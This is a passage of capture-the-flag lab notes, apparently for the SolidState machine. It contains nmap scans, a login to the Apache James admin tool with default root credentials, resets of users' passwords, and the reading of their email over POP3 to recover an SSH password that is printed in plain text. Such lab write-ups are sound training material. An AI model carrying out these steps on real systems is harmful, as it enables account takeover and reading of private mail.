##### nmap

All port scan
```bash
sudo nmap -sV -p- -v 10.10.10.75 -oA nmap2
```
```
PORT      STATE    SERVICE
22/tcp    open     ssh
25/tcp    open     smtp
80/tcp    open     http
110/tcp   open     pop3
119/tcp   open     nntp
1419/tcp  filtered timbuktu-srv3
4555/tcp  open     rsip
38682/tcp filtered unknown
```

Service scan
```bash
sudo nmap -sC -sV 10.10.10.51 -p 22,25,80,110,119,1419,4555,38682 -v -oA nmap
```
```
PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp    open   smtp          JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.7 [10.10.14.7])
80/tcp    open   http          Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp   open   pop3          JAMES pop3d 2.3.2
119/tcp   open   nntp          JAMES nntpd (posting ok)
1419/tcp  closed timbuktu-srv3
4555/tcp  open   rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
38682/tcp closed unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.94SVN%I=7%D=8/31%Time=66D34F04%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\
SF:nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPas
SF:sword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Found an exploit that adds a user and allows RCE when someone logs in via SSH. But that did not work as there is nobody SSHing into the system. 
- Connecting to Apache James Admin Tool v2.3.2
```bash
telnet 10.10.10.51 4555
Login id: root
password: root
```
Apache James HELP
![[Pasted image 20240901115607.png]]

- listusers
![[Pasted image 20240901115724.png]]
- setpassword \[username] \[password]
![[Pasted image 20240901115859.png]]

We know that pop3 server is up and running which can be used to communicate with mail server, log in as a particular user and retrieve their emails
https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop

- Using the commands, logged in as user john
```bash
telnet 10.10.10.51 110
USER john
PASS john
LIST 
RETR 1
```
![[Pasted image 20240901120238.png]]

- user `mindy`. Mindy has 2 emails
- ![[Pasted image 20240901120355.png]]
- ![[Pasted image 20240901120407.png]]

We have mindy's SSH credentials
`mindy:P@55W0rd1!2@`